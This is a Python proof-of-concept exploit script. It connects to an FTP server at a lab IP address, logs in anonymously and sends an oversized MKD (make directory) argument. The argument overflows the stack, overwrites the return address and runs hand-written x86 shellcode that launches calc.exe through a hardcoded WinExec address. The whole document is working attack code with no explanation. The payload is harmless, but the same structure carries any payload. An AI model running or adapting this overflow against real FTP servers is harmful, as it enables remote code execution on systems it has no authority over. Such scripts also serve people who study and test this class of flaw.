import socket
import sys

# pop calc.exe with winExec API
winExec = ""
winExec += "\x33\xc0"               # XOR EAX,EAX
winExec += "\x50"                   # PUSH EAX
winExec += "\x68\x2E\x65\x78\x65"   # PUSH ".exe"
winExec += "\x68\x63\x61\x6C\x63"   # PUSH "calc"
winExec += "\x8B\xC4"               # MOV EAX,ESP
winExec += "\x6A\x01"               # PUSH 1
winExec += "\x50"                   # PUSH EAX
winExec += "\xBB\x5D\x2B\x86\x7C"   # MOV EAX, 7C862B5D
winExec += "\xFF\xD3"               # CALL EBX

buffer = "\x90" *20
buffer += winExec
evil = "A"*247 + "\x59\x54\xC3\x77" + buffer + "C"*(749-len(buffer))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.50.128',21))

s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
